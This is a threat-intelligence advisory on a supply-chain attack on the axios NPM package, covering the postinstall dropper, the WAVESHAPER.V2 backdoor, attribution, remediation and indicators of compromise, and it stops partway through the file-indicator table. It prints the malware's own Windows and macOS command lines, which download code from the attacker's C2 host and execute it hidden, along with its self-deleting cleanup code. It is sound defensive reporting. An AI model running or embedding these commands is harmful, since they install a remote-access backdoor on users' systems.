-<p><span style="vertical-align: baseline;">Google Threat Intelligence Group (GTIG) is tracking an active software supply chain attack targeting the popular Node Package Manager (NPM) package "</span><a href="https://www.npmjs.com/package/axios" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">axios</span></a><span style="vertical-align: baseline;">." Between March 31, 2026, 00:21 and 03:20 UTC, an attacker introduced a malicious dependency named "</span><code style="vertical-align: baseline;">plain-crypto-js</code>"<span style="vertical-align: baseline;"> into axios NPM releases versions 1.14.1 and 0.30.4. Axios is the most popular JavaScript library used to simplify HTTP requests, and these packages typically have over 100 million and 83 million weekly downloads, respectively. This malicious dependency is an obfuscated dropper that deploys the WAVESHAPER.V2 backdoor across Windows, macOS, and Linux.</span></p>
-<p><span style="vertical-align: baseline;"><span style="vertical-align: baseline;">GTIG attributes this activity to </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering"><span style="text-decoration: underline; vertical-align: baseline;">UNC1069</span></a><span style="vertical-align: baseline;">, a financially motivated North Korea-nexus threat actor active since at least 2018, based on the use of </span><span style="vertical-align: baseline;">WAVESHAPER.V2</span><span style="vertical-align: baseline;">, an updated version of </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering"><span style="text-decoration: underline; vertical-align: baseline;">WAVESHAPER</span></a><span style="vertical-align: baseline;"> previously used by this threat actor</span><span style="vertical-align: baseline;">. Further, analysis of infrastructure artifacts used in this attack shows overlaps with infrastructure used by UNC1069 in past activities</span>.</span></p>
-<p><span style="vertical-align: baseline;">This blog details the attack lifecycle, from the initial account compromise to the deployment of operating system (OS)-specific payloads, and provides actionable guidance for defenders to identify and mitigate this threat.</span></p>
-<h3><span style="vertical-align: baseline;">Campaign Overview</span></h3>
-<p><span style="vertical-align: baseline;">On March 31, 2026, GTIG observed the introduction of </span><code style="vertical-align: baseline;">plain-crypto-js</code><span style="vertical-align: baseline;"> version 4.2.1 as a dependency in the legitimate </span><code style="vertical-align: baseline;">axios</code><span style="vertical-align: baseline;"> package version 1.14.1. Analysis indicates the maintainer account associated with the </span><code style="vertical-align: baseline;">axios</code><span style="vertical-align: baseline;"> package was compromised, with the associated email address changed to an attacker-controlled account (</span><code style="vertical-align: baseline;">ifstap@proton.me</code><span style="vertical-align: baseline;">).</span></p>
-<p><span style="vertical-align: baseline;">The threat actor used the </span><code style="vertical-align: baseline;">postinstall</code><span style="vertical-align: baseline;"> hook within the "</span><code style="vertical-align: baseline;">package.json"</code><span style="vertical-align: baseline;"> file of the malicious dependency to achieve silent execution. Upon installation of the compromised </span><code style="vertical-align: baseline;">axios</code><span style="vertical-align: baseline;"> package, NPM automatically executes an obfuscated JavaScript dropper named "</span><code style="vertical-align: baseline;">setup.js"</code><span style="vertical-align: baseline;"> in the background.</span></p></div>
-<div class="block-paragraph_advanced"><pre class="language-plain"><code> "scripts": {
-    "test": "echo \"Error: no test specified\" &amp;&amp; exit 1",
-    "postinstall": "node setup.js"
-
-  }</code></pre></div>
-<div class="block-paragraph_advanced"><h3><strong style="vertical-align: baseline;">Malware </strong><span style="vertical-align: baseline;">Analysis</span><strong style="vertical-align: baseline;"> </strong></h3>
-<p><span style="vertical-align: baseline;">The </span><code style="vertical-align: baseline;">plain-crypto-js</code><span style="vertical-align: baseline;"> package serves as a payload delivery vehicle. The core component, SILKBELL, </span><code style="vertical-align: baseline;">setup.js</code><span style="vertical-align: baseline;"> (SHA256: </span><code style="vertical-align: baseline;">e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09</code><span style="vertical-align: baseline;">), dynamically checks the target system's operating system upon execution to deliver platform-specific payloads.</span></p>
-<p><span style="vertical-align: baseline;">The script uses a custom XOR and Base64-based string obfuscation routine to conceal the command-and-control (C2 or C&amp;C) URL and host OS execution commands. To evade static analysis, it dynamically loads </span><code style="vertical-align: baseline;">fs</code><span style="vertical-align: baseline;">, </span><code style="vertical-align: baseline;">os</code><span style="vertical-align: baseline;">, and </span><code style="vertical-align: baseline;">execSync</code><span style="vertical-align: baseline;">. After successfully dropping the secondary payload, </span><code style="vertical-align: baseline;">setup.js</code><span style="vertical-align: baseline;"> attempts to delete itself and revert the modified </span><code style="vertical-align: baseline;">package.json</code><span style="vertical-align: baseline;"> to hide forensic traces of the </span><code style="vertical-align: baseline;">postinstall</code><span style="vertical-align: baseline;"> hook.</span></p>
-<h4><span style="vertical-align: baseline;">Operating System-Specific Execution Paths</span></h4>
-<p><span style="vertical-align: baseline;">Depending on the identified platform, the dropper executes the following routines.</span></p>
-<h5><span style="vertical-align: baseline;">Windows</span></h5>
-<p><span style="vertical-align: baseline;">The dropper actively hunts for the native </span><code style="vertical-align: baseline;">powershell.exe</code><span style="vertical-align: baseline;"> binary. To evade detection, it copies the legitimate executable to </span><code style="vertical-align: baseline;">%PROGRAMDATA%\wt.exe</code><span style="vertical-align: baseline;">. It then downloads a PowerShell script via </span><code style="vertical-align: baseline;">curl</code><span style="vertical-align: baseline;"> using the POST body </span><code style="vertical-align: baseline;">packages.npm.org/product1</code><span style="vertical-align: baseline;"> and saves it to the user's AppData Temp directory (e.g., </span><code style="vertical-align: baseline;">%TEMP%\6202033.ps1</code><span style="vertical-align: baseline;">). The payload is executed using a copied Windows Terminal executable with hidden and execution policy bypass flags.</span></p></div>
-<div class="block-paragraph_advanced"><pre class="language-plain"><code>Set objShell = CreateObject("WScript.Shell")    
-objShell.Run "cmd.exe /c curl -s -X POST -d packages.npm.org/product1 http://sfrclak[.]com:8000/6202033 &gt; %TEMP%\6202033.ps1 
-  			  &amp; %PROGRAMDATA%\wt.exe -w hidden -ep bypass -file %TEMP%\6202033.ps1 http://sfrclak[.]com:8000/6202033 &amp; del ""PS_PATH"" /f", 0, False</code></pre></div>
-<div class="block-paragraph_advanced"><h5><span style="vertical-align: baseline;">macOS</span></h5>
-<p><span style="vertical-align: baseline;">The malware uses </span><code style="vertical-align: baseline;">bash</code><span style="vertical-align: baseline;"> and </span><code style="vertical-align: baseline;">curl</code><span style="vertical-align: baseline;"> to download a native Mach-O binary payload to </span><code style="vertical-align: baseline;">/Library/Caches/com.apple.act.mond</code><span style="vertical-align: baseline;"> using the POST body </span><code style="vertical-align: baseline;">packages.npm.org/product0</code><span style="vertical-align: baseline;">. It modifies permissions to make the file executable and launches it via </span><code style="vertical-align: baseline;">zsh</code><span style="vertical-align: baseline;"> in the background.</span></p></div>
-<div class="block-paragraph_advanced"><pre class="language-plain"><code>try
-    do shell script "
-    	curl -o /Library/Caches/com.apple.act.mond 
-  		-d packages.npm.org/product0 
-		-s http://sfrclak.com:8000/6202033 
-  		&amp;&amp; chmod 770 /Library/Caches/com.apple.act.mond 
-	  	&amp;&amp; /bin/zsh -c "/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &amp;" 
-  		&amp;&gt; /dev/null"
-    "
-  end try
-  do shell script "rm -rf tmp/6202033"</code></pre></div>
-<div class="block-paragraph_advanced"><h5><span style="vertical-align: baseline;">Linux</span></h5>
-<p><span style="vertical-align: baseline;">The script downloads a Python backdoor to </span><code style="vertical-align: baseline;">/tmp/ld.py</code><span style="vertical-align: baseline;"> using the POST body </span><code style="vertical-align: baseline;">packages.npm.org/product2</code><span style="vertical-align: baseline;">.</span></p>
-<h5><span style="vertical-align: baseline;">Cleanup</span><span style="font-style: italic; vertical-align: baseline;"> </span></h5>
-<p><span style="vertical-align: baseline;">Aside from removing downloaded scripts in two execution branches, the script attempts to remove itself and replace an injected package.json with an original one, which was stored as "</span><code style="vertical-align: baseline;">package.md</code><span style="vertical-align: baseline;">".</span></p></div>
-<div class="block-paragraph_advanced"><pre class="language-plain"><code>const K = __filename;
-t.unlink(K, (x =&gt; {}))
-t.unlink('package.json', (x =&gt; {})), t.rename('package.md', 'package.json', ord)</code></pre></div>
-<div class="block-paragraph_advanced"><h4><span style="vertical-align: baseline;">WAVESHAPER.V2 Backdoor Capabilities</span></h4>
-<p><span style="vertical-align: baseline;">The platform-specific payloads ultimately deploy variants of a backdoor tracked by GTIG as WAVESHAPER.V2, a backdoor written in C++ that targets macOS to collect system information, enumerate directories, or execute additional payloads and that connects to the C2 provided via command-line arguments. Notably, GTIG identified additional variants of WAVESHAPER.V2 written in PowerShell and Python to target diverse environments. Regardless of the operating system, the malware beacons to the C2 endpoint over port 8000 at 60-second intervals. The beacon consists of Base64-encoded JSON data and uses a hard-coded User-Agent: </span></p>
-<p><code style="vertical-align: baseline;">mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)</code></p>
-<p><span style="vertical-align: baseline;">Following the initial beaconing to the adversary infrastructure, WAVESHAPER.V2 continuously polls, pausing for 60 seconds awaiting instructions. The server response determines the next action taken by the implant. The backdoor supports multiple commands outlined in the Table 1.</span></p></div>
-<div class="block-paragraph_advanced"><div align="left">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;"><table><colgroup><col /><col /></colgroup>
-<thead>
-<tr>
-<th scope="col" style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><strong style="vertical-align: baseline;">Command</strong></p>
-</th>
-<th scope="col" style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><strong style="vertical-align: baseline;">Description</strong></p>
-</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">kill</code></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">Terminates the malware's execution process.</span></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">rundir</code></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">Retrieves detailed directory listings, including file paths, sizes, and creation/modification timestamps for paths specified in the </span><code style="vertical-align: baseline;">ReqPaths</code><span style="vertical-align: baseline;"> parameter.</span></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">runscript</code></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">Decodes and executes a provided AppleScript payload.</span></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">peinject</code></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p>Decodes, drops, ad-hoc signs, and executes an arbitrary binary payload with optional parameters.</p>
-</td>
-</tr>
-</tbody>
-</table></div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-<div align="left" style="text-align: center;"><span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;">Table 1: WAVESHAPER.V2<span style="vertical-align: baseline;"> commands</span></span></div></div>
-<div class="block-paragraph_advanced"><p><span style="vertical-align: baseline;">On Windows, persistence is achieved by creating a hidden batch file (</span><code style="vertical-align: baseline;">%PROGRAMDATA%\system.bat</code><span style="vertical-align: baseline;">) and adding a new entry named </span><code style="vertical-align: baseline;">MicrosoftUpdate</code><span style="vertical-align: baseline;"> to </span><code style="vertical-align: baseline;">HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</code><span style="vertical-align: baseline;"> to launch it at logon.</span></p>
-<p><span style="vertical-align: baseline;">WAVESHAPER.V2 acts as a fully functional RAT with the following capabilities:</span></p>
-<ul>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Reconnaissance:</strong><span style="vertical-align: baseline;"> Extracts system telemetry, including hostname, username, boot time, time zone, OS version, and detailed running process lists.</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Command Execution:</strong><span style="vertical-align: baseline;"> Supports multiple execution methods, including in-memory Portable Executable (PE) injection and arbitrary shell commands. The shell execution command expects a script and script parameters from C2; if no script is provided, the parameter is executed as a PowerShell command, but if a script is provided, it is either Base64-encoded or placed into a file depending on its size.</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">File System Enumeration:</strong><span style="vertical-align: baseline;"> Returns detailed metadata for requested target directories by continuously recursing through the file system.</span></p>
-</li>
-</ul>
-<h3><span style="vertical-align: baseline;">Attribution</span></h3>
-<p><span style="vertical-align: baseline;">GTIG attributes this activity to </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering"><span style="text-decoration: underline; vertical-align: baseline;">UNC1069</span></a><span style="vertical-align: baseline;">, a financially motivated North Korea-nexus threat actor active since 2018. Analysis of the C2 infrastructure (</span><code style="vertical-align: baseline;">sfrclak[.]com</code><span style="vertical-align: baseline;"> resolving to </span><code style="vertical-align: baseline;">142.11.206.73</code><span style="vertical-align: baseline;">) revealed connections from a specific AstrillVPN node previously used by UNC1069. Additionally, adjacent infrastructure hosted on the same ASN has been historically linked to UNC1069 operations.</span></p>
-<p><span style="vertical-align: baseline;"><span style="vertical-align: baseline;">Furthermore, WAVESHAPER.V2 is a direct evolution of </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering"><span style="text-decoration: underline; vertical-align: baseline;">WAVESHAPER</span></a><span style="vertical-align: baseline;">, a macOS and Linux backdoor previously attributed to UNC1069. While the original WAVESHAPER uses a lightweight, raw binary C2 protocol and employs code packing, WAVESHAPER.V2 communicates using JSON, collects additional system information, and supports more backdoor commands. Despite these upgrades, both versions accept their C2 URL dynamically via command-line arguments, share identical C2 polling behaviors and an uncommon User-Agent string, and deploy secondary payloads to identical temporary directories</span> (e.g., </span><code style="vertical-align: baseline;">/Library/Caches/com.apple.act.mond</code><span style="vertical-align: baseline;">).</span></p>
-<h3><span style="vertical-align: baseline;">Outlook and Implications</span></h3>
-<p><span style="vertical-align: baseline;">The impact of this attack by North Korea-nexus actors is broad and has ripple effects as other popular packages rely on axios as a dependency. Notably, UNC1069 isn’t the only threat actor that has launched successful open source supply chain attacks in recent weeks. UNC6780 (also known as TeamPCP) recently poisoned GitHub Actions and PyPI packages associated with projects like Trivy, Checkmarx, and LiteLLM to deploy the SANDCLOCK credential stealer and facilitate follow-on extortion operations. </span></p>
-<p><span style="vertical-align: baseline;">Hundreds of thousands of stolen secrets could potentially be circulating as a result of these recent attacks. This could enable further software supply chain attacks, software as a service (SaaS) environment compromises (leading to downstream customer compromises), ransomware and extortion events, and cryptocurrency theft over the near term. </span></p>
-<p><span style="vertical-align: baseline;">Supply chain compromise is a particularly dangerous tactic because it abuses the inherent trust that users and enterprise administrators place in hardware, software, and updates supplied by reputable vendors as well as the trust they may not realize they are placing in collaborative code-sharing communities. Defenders should pay close attention to these campaigns, and enterprises should initiate dedicated efforts to assess the existing impact, remediate compromised systems, and harden environments against future attacks.</span></p>
-<h3><span style="vertical-align: baseline;">Remediation</span><strong style="vertical-align: baseline;"> </strong></h3>
-<p><span style="vertical-align: baseline;">GTIG urges all developers and organizations using the axios package to take immediate corrective action. Priority should be given to auditing dependency trees for compromised versions, isolating affected hosts, and rotating any potentially exposed secrets or credentials. Following initial containment, organizations must implement long-term hardening through strict version pinning and enhanced supply-chain monitoring.</span></p>
-<ul>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Version Control:</strong><span style="vertical-align: baseline;"> Do not upgrade to axios version 1.14.1 or 0.30.4. Ensure corporate-managed NPM repositories are configured to serve only known-good versions (e.g., 1.14.0 or earlier; 0.30.3 or earlier).</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Dependency Pinning:</strong><span style="vertical-align: baseline;"> Pin axios to a known safe version in your </span><code style="vertical-align: baseline;">package-lock.json</code><span style="vertical-align: baseline;"> to prevent accidental upgrades.</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Malicious Package Audit:</strong><span style="vertical-align: baseline;"> Inspect project lockfiles specifically for the 'plain-crypto-js' package (versions 4.2.0 or 4.2.1). Use tools like </span><a href="https://wiz.io" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">Wiz</span></a><span style="vertical-align: baseline;"> or </span><a href="https://deps.dev/" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">Open Source Insights</span></a><span style="vertical-align: baseline;"> for deeper dependency auditing.</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Pipeline Security:</strong><span style="vertical-align: baseline;"> Pause CI/CD deployments for any package relying on axios. Validate that builds are not pulling "latest" versions before redeploying with pinned, safe versions. </span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Incident Response:</strong><span style="vertical-align: baseline;"> If </span><code style="vertical-align: baseline;">plain-crypto-js</code><span style="vertical-align: baseline;"> is detected, assume the host environment is compromised. Revert the environment to a known-good state and rotate all credentials or secrets present on that machine.</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Network Defense:</strong><span style="vertical-align: baseline;"> Block all traffic to sfrclak[.]com and the command &amp; control IP: 142.11.206.73. Monitor and alert on any endpoint communication attempts to this domain.</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Cache Remediation:</strong><span style="vertical-align: baseline;"> Clear local and shared npm, yarn, and pnpm caches on all workstations and build servers to prevent re-infection during subsequent installs.</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Endpoint Protection:</strong><span style="vertical-align: baseline;"> Deploy EDR to protect developer environments. Monitor for suspicious processes spawning from Node.js applications that match known Indicators of Compromise (IOCs).</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><strong style="vertical-align: baseline;">Credential Management:</strong><span style="vertical-align: baseline;"> Rotate all tokens and API keys used by applications confirmed to have run indicators of compromise (IOCs).</span></p>
-</li>
-<li style="vertical-align: baseline;"><span style="vertical-align: baseline;"><strong style="vertical-align: baseline;">Developer Sandboxing &amp; Secret Vaulting</strong><span style="vertical-align: baseline;">: Isolate development environments in containers or sandboxes to restrict host filesystem access, and migrate plaintext secrets to the OS keychain using </span><a href="https://github.com/ByteNess/aws-vault?tab=readme-ov-file" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">aws-vault</span></a><span style="vertical-align: baseline;">. This ensures compromised packages cannot programmatically scrape credentials or execute malicious scripts directly on the host machine.</span></span></li>
-</ul>
-<h3><span style="vertical-align: baseline;">Indicators of Compromise (IOCs) </span></h3>
-<p><span style="vertical-align: baseline;">To assist the wider community in hunting and identifying the activity outlined in this blog post, we have included IOCs in a free </span><a href="https://www.virustotal.com/gui/collection/c5adea0fa8aac14e6aabd8d3d4a1d19e4cd0eb76e679f2e9d3fed2a3170c09bb/summary" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">GTI Collection</span></a><span style="vertical-align: baseline;"> for registered users.</span></p>
-<h4><span style="vertical-align: baseline;">Network Indicators</span></h4></div>
-<div class="block-paragraph_advanced"><div align="left">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;"><table border="1px" cellpadding="16px" style="border-collapse: collapse; width: 100%;"><colgroup><col /><col /><col /></colgroup>
-<tbody>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><strong style="vertical-align: baseline;">Indicator</strong></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><strong style="vertical-align: baseline;">Type </strong></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><strong style="vertical-align: baseline;">Notes </strong></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">142.11.206.73</code></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">C2</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p>WAVESHAPER.V2</p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">sfrclak[.]com</code></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">C2</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p>WAVESHAPER.V2</p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">http://sfrclak[.]com:8000</code></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">C2</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p>WAVESHAPER.V2</p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">http://sfrclak[.]com:8000/6202033</code></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">C2</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p>WAVESHAPER.V2</p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">23.254.167.216</code></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">C2</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">Suspected UNC1069 Infrastructure</span></p>
-</td>
-</tr>
-</tbody>
-</table></div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div></div>
-<div class="block-paragraph_advanced"><h4>File Indicators</h4></div>
-<div class="block-paragraph_advanced"><div align="left">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;">
-<div style="color: #5f6368; width: 100%;"><table><colgroup><col /><col /><col /></colgroup>
-<tbody>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><strong style="vertical-align: baseline;">Family</strong></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><strong style="vertical-align: baseline;">Notes</strong></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><strong style="vertical-align: baseline;">SHA256</strong></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p>WAVESHAPER.V2</p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">Linux Python RAT</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf</code></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p>WAVESHAPER.V2</p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">macOS Native Binary</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a</code></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p>WAVESHAPER.V2</p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">Windows Stage 1</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101</code></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p>WAVESHAPER.V2</p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">N/A </span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c</code></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">SILKBELL</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">N/A </span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09</code></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">N/A </span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">system.bat</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd</code></p>
-</td>
-</tr>
-<tr>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
